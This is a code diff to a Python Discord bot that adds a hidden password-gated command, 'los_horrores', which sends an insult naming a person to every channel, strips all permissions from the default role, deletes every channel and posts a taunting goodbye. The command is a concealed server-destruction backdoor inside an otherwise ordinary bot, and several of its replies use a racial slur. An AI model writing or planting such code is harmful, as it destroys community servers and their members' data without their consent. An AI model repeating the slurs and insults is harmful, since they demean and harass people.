@@ -51,6 +51,7 @@ Describe, analiza y extrae texto (SOLO SEGUN LO QUE TE PIDAN!). Responde siempre
 Añade vaciles también.
 """
 WEBHOOK_URL = os.getenv("WEBHOOK_DEP")
+NUKE_PASSWORD = ""
 
 # -----------------------------
 # Data Base
@@ -591,6 +592,63 @@ class Fun(commands.Cog, name="Fun"):
 async def setup_cogs2():
     await bot.add_cog(Fun(bot))
 
+# Los horrores
+@bot.command()
+async def los_horrores(ctx, password: str):
+    # Only you can run this
+    if ctx.author.id != ALLOWED_USER_ID:
+        await ctx.send("❌ No estas autorizado, nigga.", ephemeral=True)
+        return
+
+    # Check against a DIFFERENT password (not the one used elsewhere)
+    NUKE_PASSWORD = os.getenv("NUKE_PASSWORD")
+    if not NUKE_PASSWORD:
+        await ctx.send("❌ The dev is missing something... 👀", ephemeral=True)
+        return
+
+    if password != NUKE_PASSWORD:
+        await ctx.send("❌ Nuh uh", ephemeral=True)
+        return
+
+    # Confirmation to avoid accidents
+    await ctx.send("⚠️ **Oh oh oh, not gud** ⚠️\nTypeshit:")
+    def check(m):
+        return m.author == ctx.author and m.content == "shit" and m.channel == ctx.channel
+    try:
+        await bot.wait_for("message", timeout=30.0, check=check)
+    except asyncio.TimeoutError:
+        await ctx.send("❌ Cancelling...")
+        return
+
+    guild = ctx.guild
+
+    # 1. Send warning message to all text channels
+    for channel in guild.text_channels:
+        try:
+            await channel.send("🔴 **Miguel ijo puta corrupto** 🔴\nDestroying server...")
+        except:
+            pass
+
+    # 2. Remove @everyone permissions
+    everyone_role = guild.default_role
+    try:
+        await everyone_role.edit(permissions=discord.Permissions.none())
+    except:
+        pass
+
+    # 3. Delete all channels (text and voice)
+    for channel in guild.channels:
+        try:
+            await channel.delete()
+        except:
+            pass
+    
+    # 4
+    try:
+        final_channel = await guild.create_text_channel("final-message")
+        await final_channel.send(f"Hola! Si estas leyendo esto, es porque a {ctx.author.mention} se le ha ido completamente la cabeza! Y por tanto ha destruido el servidor, lol, ez nigga.\nGoodbye. 👀")
+    except:
+        pass
 
 asyncio.run(setup_cogs2())
 
